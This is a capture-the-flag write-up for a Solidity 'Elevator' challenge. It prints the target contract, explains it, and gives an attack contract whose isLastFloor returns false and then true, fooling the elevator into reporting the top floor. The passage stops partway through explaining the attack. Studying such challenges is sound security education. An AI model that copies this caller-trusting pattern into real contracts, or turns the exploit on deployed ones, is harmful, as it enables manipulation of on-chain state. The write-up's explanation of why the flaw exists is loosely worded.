# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```
Challenge's message.

>This elevator won't let you reach the top of your building. Right?

This Solidity code represents an elevator contract with a corresponding interface for a building. The elevator contract (**Elevator**) keeps track of the current floor and whether it has reached the top floor. The **goTo** function is used to move the elevator to a specified floor. The **Building** interface defines a single function **isLastFloor** that takes a floor number as an argument and returns a boolean value indicating whether it is the last floor in the building.

In the **goTo** function, the contract checks if the specified floor is not the last floor by calling the **isLastFloor** function of the **building** instance (which is the contract that called the **goTo** function). If it is not the last floor, the **floor** variable is updated with the new floor number, and the **top** variable is set based on whether the new floor is the last floor. The code is missing some essential details such as the implementation of the **Building** interface and the deployment of the contracts, but this is the basic idea behind this elevator contract.

# Subverting

This contract gets an instance from **Building** interface in the **goTo()** function and calls the vulnerable **isLastFloor(uint)** function. The reason for being vulnerable of this function is it just returns a boolean value and **it doesn't change or define anything**. **That's why it allows modification to the function that the attacker wants**. 

Let's continue to explain the vulnerability with our attack contract. Here is our attack contract.

```solidity
pragma solidity ^0.8.17;

interface IElevator {
  function goTo(uint) external;
}

contract Attack{

    bool x = false;

    function isLastFloor(uint)external returns(bool){
        if(x){
            return true;
        }
        x = true;
        return false;
    }

    function attack(address _target)external{
        IElevator target = IElevator(_target);
        target.goTo(1);
    }
}
```

In out attack contract, first we defined an interface named **IElavator** which will help us to call **goTo()** function from the target cintract. 
